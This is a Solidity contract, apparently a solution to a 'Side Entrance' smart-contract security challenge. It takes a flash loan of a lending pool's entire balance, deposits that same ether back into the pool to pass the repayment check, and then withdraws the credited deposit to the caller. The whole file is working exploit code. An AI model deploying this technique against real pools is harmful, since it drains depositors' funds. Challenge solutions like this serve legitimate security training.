// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {

    function flashloan(address pool) external {
        ISideEntranceLenderPool(pool).flashLoan(pool.balance);
    }

    function execute() external payable override {
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function withdraw(address pool) external {
        ISideEntranceLenderPool(pool).withdraw();
        (bool success,) = address(msg.sender).call{value:address(this).balance}("");
        require(success, "Failed to send ether");
    }
    receive() external payable {}
}